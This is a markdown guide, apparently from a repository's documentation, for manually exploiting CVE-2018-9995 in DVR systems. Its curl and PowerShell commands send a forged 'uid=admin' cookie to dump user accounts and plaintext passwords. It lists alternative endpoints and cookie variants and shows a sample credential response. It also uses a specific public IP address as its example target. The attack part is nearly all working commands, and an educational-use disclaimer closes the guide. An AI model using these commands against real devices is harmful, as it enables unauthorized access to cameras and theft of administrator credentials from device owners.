# Manual Testing Guide

This guide provides instructions for manually testing DVR systems for the CVE-2018-9995 vulnerability without using the Python script.

## Prerequisites

- Basic understanding of command line tools
- curl installed on your system (comes pre-installed on most Linux/macOS systems, can be downloaded for Windows)

## Testing for the Vulnerability

### Basic Test

The simplest way to test if a DVR system is vulnerable is to use curl:

```bash
curl "http://<dvr_host>:<port>/device.rsp?opt=user&cmd=list" -H "Cookie: uid=admin"
```

Replace `<dvr_host>` with the IP address or hostname of the target DVR, and `<port>` with the port number (usually 80, 8000, or 49152).

### Example

```bash
curl "http://59.26.65.69:49152/device.rsp?opt=user&cmd=list" -H "Cookie: uid=admin"
```

### Interpreting Results

#### Vulnerable System Response:

A vulnerable system will return a JSON response containing user credentials:

```json
{"result":0,"list":[{"uid":"admin","pwd":"Op1234567#","role":2,"enmac":0,"mac":"00:00:00:00:00:00","playback":4294967295,"view":4294967295,"rview":4294967295,"ptz":4294967295,"backup":4294967295,"opt":4294967295}]}
```

Key elements to look for:
- `"uid"`: Username (often "admin")
- `"pwd"`: Password
- `"role"`: User role level (usually 1 or 2 for admin)

#### Non-vulnerable System Response:

A non-vulnerable system might return:
- An error message
- An empty response
- A login page
- A permission denied message
- A different JSON structure without credentials

### Alternative Commands

For some DVR models, you might need to try different variations:

#### Alternative Endpoints:

```bash
# Try different endpoint
curl "http://<dvr_host>:<port>/users.cgi?action=list" -H "Cookie: uid=admin"
```

#### Different Cookie Values:

```bash
# Try different cookie
curl "http://<dvr_host>:<port>/device.rsp?opt=user&cmd=list" -H "Cookie: dvr_sessionid=admin"
```

### Windows Users

If you're using Windows and have curl installed, use the following syntax (with double quotes):

```
curl "http://<dvr_host>:<port>/device.rsp?opt=user&cmd=list" -H "Cookie: uid=admin"
```

If you're using PowerShell:

```powershell
Invoke-WebRequest -Uri "http://<dvr_host>:<port>/device.rsp?opt=user&cmd=list" -Headers @{"Cookie"="uid=admin"}
```

## ⚠️ Important Note

This information is provided **STRICTLY FOR EDUCATIONAL PURPOSES ONLY**. Only test systems that you own or have explicit permission to test. Unauthorized testing is illegal. 